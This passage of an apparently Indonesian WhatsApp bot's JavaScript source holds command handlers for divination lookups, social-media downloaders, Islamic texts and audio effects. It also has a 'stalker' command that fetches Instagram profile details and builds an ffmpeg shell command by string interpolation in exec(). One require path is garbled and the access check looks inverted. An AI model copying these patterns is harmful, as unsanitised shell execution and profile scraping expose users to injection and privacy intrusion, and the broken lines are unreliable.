                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tahun_lahir}\n│➳ *Gender :* ${anu.message.jenis_kelamin}\n│➳ *Angka Kua :* ${anu.message.angka_kua}\n│➳ *Kelompok :* ${anu.message.kelompok}\n│➳ *Karakter :* ${anu.message.karakter}\n│➳ *Sektor Baik :* ${anu.message.sektor_baik}\n│➳ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Kala Tinantang :* ${anu.message.kala_tinantang}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Info :* ${anu.message.info}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hari Naas :* ${anu.message.hari_naas}\n│➳ *Info :* ${anu.message.catatan}\n│➳ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hari Lahir :* ${anu.message.hari_lahir}\n│➳ *tanggal Lahir :* ${anu.message.tgl_lahir}\n│➳ *Arah Rezeki :* ${anu.message.arah_rejeki}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Zodiak :* ${anu.message.zodiak}\n│➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➳ *Warna :* ${anu.message.warna_keberuntungan}\n│➳ *Batu :* ${anu.message.batu_keberuntungan}\n│➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
	    if (!isCreator && !isBan) return
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    jobotz.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`│➳ Name : ${anu.name}\n│➳ Version : ${Object.keys(anu.versions)}\n│➳ Created : ${tanggal(anu.time.created)}\n│➳ Modified : ${tanggal(anu.time.modified)}\n│➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➳ Description : ${anu.description}\n│➳ Homepage : ${anu.homepage}\n│➳ Keywords : ${anu.keywords}\n│➳ Author : ${anu.author.name}\n│➳ License : ${anu.license}\n│➳ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) jobotz.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    jobotz.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await jobotz.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await jobotz.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➳ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                jobotz.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
            if (!isCreator && !isBan) return
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
│➳ Title : ${anu.title}
│➳ Author : ${anu.author.name}
│➳ Like : ${anu.like}
│➳ Caption : ${anu.caption}
│➳ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: jobotz.user.name,
			buttons,
			headerType: 4
		    }
		    jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│➳ Title : ${anu.title}\n│➳ Author : ${anu.author.name}\n│➳ Like : ${anu.like}\n│➳ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
        if (!isCreator && !isBan) return
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		jobotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		if (!isCreator && !isBan) return
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		jobotz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (!isCreator && !isBan) return
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		jobotz.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
		   if (!isCreator && !isBan) return
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                jobotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (!isCreator) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (!isCreator && !isBan) return
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
            if (!isCreator && !isBan) return
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                jobotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
            if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                jobotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
